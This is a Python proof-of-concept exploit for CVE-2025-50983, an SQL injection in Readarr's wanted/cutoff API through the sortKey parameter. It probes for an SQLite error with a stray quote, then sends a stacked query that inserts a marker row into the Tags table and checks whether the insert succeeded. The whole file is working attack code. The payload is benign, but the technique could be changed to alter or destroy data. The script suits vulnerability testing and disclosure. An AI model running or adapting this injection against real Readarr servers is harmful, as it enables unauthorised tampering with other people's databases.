#!/usr/bin/env python3
import requests
import argparse
import sys
import uuid


def test_sqli(base_url, api_key):
    """Test SQL injection by inserting a proof record into Tags table"""
    headers = {"X-Api-Key": api_key}
    
    proof_value = f"SQLI_PROOF_{uuid.uuid4().hex[:8].upper()}"
    
    print(f"[*] Checking Tags table before injection...")
    try:
        resp = requests.get(f"{base_url}/api/v1/tag", headers=headers, timeout=10)
        tags_before = resp.json()
        existing_labels = [t.get("label", "") for t in tags_before]
        print(f"[*] Current tags: {existing_labels}")
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    if proof_value in existing_labels:
        print(f"[-] Proof value already exists, using new one")
        proof_value = f"SQLI_PROOF_{uuid.uuid4().hex[:8].upper()}"
    
    print(f"[*] Injecting stacked query to insert: {proof_value}")
    sqli_payload = f'releaseDate";INSERT INTO Tags(Label) VALUES(\'{proof_value}\')--'
    
    try:
        resp = requests.get(
            f"{base_url}/api/v1/wanted/cutoff",
            headers=headers,
            params={
                "page": 1,
                "pageSize": 20,
                "sortDirection": "descending",
                "sortKey": sqli_payload,
                "monitored": "true"
            },
            timeout=10
        )
    except Exception as e:
        print(f"[-] Request error: {e}")
    
    print(f"[*] Checking Tags table after injection...")
    try:
        resp = requests.get(f"{base_url}/api/v1/tag", headers=headers, timeout=10)
        tags_after = resp.json()
        labels_after = [t.get("label", "") for t in tags_after]
        print(f"[*] Tags after: {labels_after}")
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    if proof_value in labels_after:
        print(f"\n[+] VULNERABLE! SQL injection confirmed!")
        print(f"[+] Successfully injected record: {proof_value}")
        print(f"[+] Stacked queries execution confirmed via data insertion")
        return True
    else:
        print(f"\n[-] Injection failed or not vulnerable")
        return False


def test_error_based(base_url, api_key):
    """Test error-based SQL injection"""
    headers = {"X-Api-Key": api_key}
    
    print(f"\n[*] Testing error-based SQL injection...")
    try:
        resp = requests.get(
            f"{base_url}/api/v1/wanted/cutoff",
            headers=headers,
            params={
                "page": 1,
                "pageSize": 20,
                "sortDirection": "descending",
                "sortKey": "releaseDate'",
                "monitored": "true"
            },
            timeout=10
        )
        
        if "SQL logic error" in resp.text:
            print(f"[+] Error-based SQLi confirmed!")
            print(f"[+] SQLite error message exposed in response")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-50983 - Readarr SQL Injection PoC")
    parser.add_argument("--url", default="http://localhost:8787", help="Target Readarr URL")
    parser.add_argument("--api-key", required=True, help="Readarr API Key")
    args = parser.parse_args()
    
    base_url = args.url.rstrip("/")
    
    print("=" * 60)
    print("CVE-2025-50983 - Readarr SQL Injection PoC")
    print("Vulnerability: sortKey parameter in /api/v1/wanted/cutoff")
    print("=" * 60)
    print(f"[*] Target: {base_url}")
    print(f"[*] API Key: {args.api_key[:8]}...")
    print()
    
    error_vuln = test_error_based(base_url, args.api_key)
    stacked_vuln = test_sqli(base_url, args.api_key)
    
    print()
    print("=" * 60)
    if error_vuln or stacked_vuln:
        print("[+] VULNERABILITY CONFIRMED: CVE-2025-50983")
        sys.exit(0)
    else:
        print("[-] Vulnerability not confirmed")
        sys.exit(1)


if __name__ == "__main__":
    main()
